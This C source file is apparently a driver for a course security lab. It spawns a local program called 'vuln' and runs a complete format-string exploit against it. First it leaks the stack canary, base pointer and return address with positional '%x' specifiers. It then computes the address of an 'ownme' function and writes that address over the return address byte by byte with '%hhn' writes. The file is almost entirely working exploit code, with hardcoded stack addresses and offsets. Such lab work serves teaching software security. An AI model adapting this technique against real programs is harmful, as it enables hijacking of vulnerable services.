#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

// Beautified print_escaped: print first two character then, gather by 4 bytes
void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   int l=-3;
   fprintf(stderr, "\n%4d:", 0); // empty line
   for (i=0; i < len; i++) {
      if(i%4==2 && i%16==2)
         fprintf(stderr, "\n%4d:", l+=4);
      else if(i%4==2)
         fprintf(stderr, " ");
      fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

int digits(int N);
char *ntos(char* at, unsigned int write);
/** 
 * Params: 
 *    at            : where to start writing "%[num]d%[deref_arg_num]$hhn%[pad]d"
 *    num           : num in "%[num]d%[deref_arg_num]$hhn%[pad]d"
 *    deref_arg_num : arg to derefernce before writing "num" on to stack
 *                    i.e., location of address space of where the address to be dereferenced is located
 *                    Unit is in # of words, regarding the location of format string for printf as 0
 * Return:
 *    char * to end of appended string "%[num]d%[deref_arg_num]$hhn%[pad]d"
 */
char* writeByte(char* at, short num, int deref_arg_num){
   // returns "%[num]d%[deref_arg_num]$hhn%[pad]d"
   // invariant: %hhn is 0x00 before printing %[num]d
   // Note. 

   char* start = at;

   // part 1: %[num]d
   num += 0x100; 
   // num has to be at least digits(MAX_INT)+1
   // + 1: possible negative sign
   *at++ = '%';
   at = ntos(at, num);
   *at++ = 'd';

   // part 2: %[deref_arg_num]$hhn
   *at++ = '%';
   at = ntos(at, deref_arg_num);
   *at++ = '$';
   *at++ = 'h';
   *at++ = 'h';
   *at++ = 'n';

   // part 3: %[pad]d
   int pad = 0x100 - num + 0x100; 
   // pad has to be at least digits(MAX_INT)+1 and (pad + num) must be divisible by 0x100

   *at++ = '%';
   at = ntos(at, pad);
   *at++='d';
   *at = '\0';

   fprintf(stderr, "writeByte(%p, 0x%x, %d) = %s\n", start, num, deref_arg_num, start);

   return at--;
}

int digits(int N){
   int ret = 0;
   do{
      ret++;
      N/=10;
   } while(N >= 1);
   return ret;
}

// number to string
char *ntos(char* at, unsigned int write){
   int n = digits(write);
   at+=n;
   while(write >= 1){
      *--at = (write % 10) + '0';
      write /= 10;
   }
   at+=n;
   return at;
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   void *main_loop2_ebp_loc =(void*) 0xbfffefa8; // location of main_loop's ebp from run #2
   void *main_loop2_ebp =(void*) 0xbfffefd8; // value of main_loop's ebp from run #2
   void *auth_user2 = (void*)0xbfffe700; // value of user variable in auth from run #2

   // this is the offset where the address of jmp to will happen
   unsigned int offset_auth_user_main_loop_bp = main_loop2_ebp - auth_user2;
   fprintf(stderr, "dirver: Expected offset of auth_user from main_loop2 ebp: %d\n", offset_auth_user_main_loop_bp);

   unsigned int offset_main_loop_ebp_ebploc = main_loop2_ebp - main_loop2_ebp_loc;

   /* Exploit idea
    * 1. Extract values
    * 2. Calculate the RA's location
    * 3. Append that into the format string to attack
    *    e.g., e   ADDR%Nd%M$hhn%Ld
    * where N is number of junk bytes to print,
    *       M is the relative location of ADDR in # of words relative to format string argument
    *       L is the # of padding characters to print out
    *
    * Note. N and L has to be at least digits(MAX_INT)+1, 
    *       because if this value is larger than N or L, 
    *       there will be more characters printed than N or L.
   */

   // Detailed steps
   // 1. Extract runtime information
   put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
   send();

   void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
   get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
      (unsigned int) canary, 
      (unsigned int) main_loop_bp, 
      (unsigned int) main_loop_ra);

   // 2. Calculate necessary values 
   // 2-1. Find address of ownme()
   int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
   void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
   fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);

   // 2-2. Find addresss of RA location
   void *ra_loc = main_loop_bp - offset_main_loop_ebp_ebploc + 0x4;
   fprintf(stderr, "driver: ra_loc is %p\n", ra_loc);

   // 3. Exploit
   // 3-1. Prepare the payload
   unsigned explsz = 400;

   char *expl = (char*) malloc(explsz);
   memset((void*)expl, 'P', explsz);

   fprintf(stderr, "driver: exploit size: %d\n", explsz);

   // 3-2. Write byte address locations in the first 16 bytes
   for(int i = 0; i < 4; i++){
      ((void**)expl)[i] = ((char*)ra_loc) + i;
   }

   // 3-3. Prepare string that overwrite the RA

   // 3-3-1. Decide where in payload to start writing
   // pad the byte address location, so that when writeByte() is called, %hhn is 0x00
   char *expl_ptr = ((char*) expl) + 4 * 4 + (0x100 - 18); 
   // + 4 * 4: for 4 address each 4 bytes
   // + 0x100: need to have %hhn be 00
   // - 18   : what has been printed so far
   //          Note. because in vuln.c, it prints from rdbuf[2], it is 18 and not 20.

   // 3-3-2. Write "%[val]d%[takeNth]$hhn%[pad]d" on to the payload
   int toWrite = (int)ownme_addr; // to preserve ownme_addr, just in case
   for(int i = 0; i < 4; i++){
      short byte = toWrite % 0x100; // byte to be written, i.e., the [val] part

      expl_ptr = writeByte(expl_ptr, byte, i + 89);
      // Note. 89 because, the rdbuf[1] is 89th parameter 
      //       from the format string location on the stack

      toWrite /= 0x100; // to get the next byte
   }

   // 4. Now, send the payload
   put_str("e   ");
   put_bin((char*)expl, explsz);          
   put_str("\n");
   send();
   fprintf(stderr, "driver: payload sent, debug now to check if the RA has successfully overwritten.\n");
   getchar();

   put_str("q \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
